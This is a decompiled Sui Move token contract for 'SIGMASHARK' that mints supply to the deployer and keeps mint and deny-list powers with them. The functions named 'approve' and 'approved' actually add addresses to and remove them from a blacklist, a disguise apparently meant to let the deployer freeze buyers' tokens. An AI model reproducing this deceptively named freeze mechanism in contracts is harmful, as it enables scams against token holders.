module 0x9f329df6dad6a652e0aa1bc1e1b4098af4d7b80bad04aac779a25d1e149afe67::SIGMASHARK {
    struct SIGMASHARK has drop {
        dummy_field: bool,
    }

    public entry fun transfer(arg0: 0x2::coin::Coin<SIGMASHARK>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<SIGMASHARK>>(arg0, arg1);
    }

    public entry fun approve(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SIGMASHARK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SIGMASHARK>(arg0, arg1, arg2, arg3);
    }

    public entry fun approved(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SIGMASHARK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SIGMASHARK>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SIGMASHARK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SIGMASHARK>(arg0, 2, b"SIGMASHARK", b"SIGMASHARK", b"Sigmashark Coin waves with strength and loyalty. https://sigmashark.pro/ - https://t.me/sigmasharkk - https://x.com/sigmasharkk", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://sigmashark.pro/wp-content/uploads/2024/12/Group-32-300x149.png"))), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SIGMASHARK>>(v2);
        let v4 = 0x2::tx_context::sender(arg1);
        0x2::coin::mint_and_transfer<SIGMASHARK>(&mut v3, 100000000, v4, arg1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SIGMASHARK>>(v3, v4);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SIGMASHARK>>(v1, v4);
    }

    // decompiled from Move bytecode v6
}

